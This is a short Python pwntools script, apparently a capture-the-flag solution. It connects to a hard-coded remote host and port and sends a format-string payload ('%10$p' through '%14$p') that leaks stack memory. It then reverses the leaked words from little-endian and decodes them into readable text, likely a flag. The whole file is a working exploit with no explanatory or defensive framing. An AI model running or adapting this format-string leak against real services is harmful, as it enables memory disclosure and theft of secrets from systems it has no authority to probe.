from pwn import *

def fetch_stack_data():
    # Setting up a connection to the remote server
    r = remote('140.113.24.241', 30172)
    
    # Send the format string vulnerability payload to leak memory addresses
    r.sendline('%10$p%11$p%12$p%13$p%14$p'.encode())
    
    # Receive the response and decode it from ASCII
    result = r.recv().decode()

    
    # Close the remote connection
    r.close()
    
    # Process and decode the leaked addresses
    final_output = []
    for rs in result.split("0x"):
        if rs:
            # Convert from hex string to bytes, handling possible errors
            try:
                by_str = bytes.fromhex(rs.strip())
                # Reverse bytes for endian 
                tmp_str = by_str[::-1].decode()
                final_output.append(tmp_str)
            except (ValueError, UnicodeDecodeError):
                continue
    
    # Return the decoded strings
    return final_output

def main():
    decoded_strings = fetch_stack_data()
    for string in decoded_strings:
        print(string, end="")
    print()

if __name__ == "__main__":
    main()
